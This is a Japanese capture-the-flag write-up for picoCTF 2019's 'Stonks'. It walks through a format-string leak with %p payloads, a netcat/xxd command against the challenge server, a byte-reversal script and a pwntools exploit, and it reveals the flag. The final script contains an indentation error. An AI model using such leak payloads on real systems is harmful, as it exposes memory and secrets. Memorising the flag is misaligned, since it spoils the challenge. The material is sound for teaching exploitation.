# Stonks
## picoCTF2019
## Binary Exploition
***

始めに問題の接続先と、接続先で実行されているプログラムが渡される。  
プログラムに目を通していくと、buy_stonks()で
```
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

のようなプログラムが動いていた。これはユーザーからの入力内容をそのまま出力しているため、書式文字列攻撃が可能である可能性がある。  
試しにこのタイミングで%pと入力してみると、
```
What is your API token?
%p
Buying stonks with token:
0x9f4f430
Portfolio as of Sat Jul 17 14:57:53 UTC 2021
```
と返ってきているため、どうやら書式文字列攻撃が可能っぽい。  
また、おそらくフラグが書かれていると思われるファイルapiがbuy_stonks()で読み込まれているため、メモリ上にフラグがあると考えられる。  
%pを入れるとメモリに書かれている内容が見れるっぽいので、大量に送り付けたらどこかにフラグがかかれてそうだが、何個がいいかわからないため、とりあえず30個ぐらい送り付ける。
```
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
0x9dda3d0.0x804b000.0x80489c3.0xf7ecfd80.0xffffffff.0x1.0x9dd8160.0xf7edd110.0xf7ecfdc7.(nil).0x9dd9180.0x1.0x9dda3b0.0x9dda3d0.0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x62633763.0x65616336.0xffc4007d.0xf7f0aaf8.0xf7edd440.0xf9a48000.0x1.(nil).0xf7d6cbe9.
Portfolio as of Sat Jul 17 15:07:13 UTC 2021
```

するとこうなった、当然だが、この状態では普通の人間には読めないため、xxdとtrを使って読める形に変える。  
>> python3 -c 'print("1\n" + "%p." * 50)' | nc mercury.picoctf.net 27912 | tr "." "\n" | xxd -r -p

すると以下の出力が返ってくる。

>> 0=?ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10}@Lō��H   K HmPLKHH$ i!S8

結構読めないところが多いが、フラグっぽいところがある。しかしリトルエンディアンになっているため、このままでは出せない。  
4文字ずつ反転させる必要があるが、手作業は面倒なので簡単にスクリプトを書く。  
```
m = "ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10}"
print(m)
for i in range(3, len(m), 4):
    for f in range(i, i-4, -1):
        print(m[f], end="")
print("}")
```
これで出てきた値をsubmitする。

これを自動化exploit.pyを作成する。
```
from pwn import *

s = ""

r = remote("mercury.picoctf.net", 27912)

r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

r.send("%x" + "-%x"*40 + "\n")

r.recvline()

x = r.recvline()

x = x[:-1].decode()

print(x) #リークしたアドレスの中身データがxに入っている

for i in x.split("-"):
    if len(i) == 8:
        a = bytearray.fromhex(i)
            for b in reversed(a):
                if b >32 and b < 128:
                    s += chr(b)
```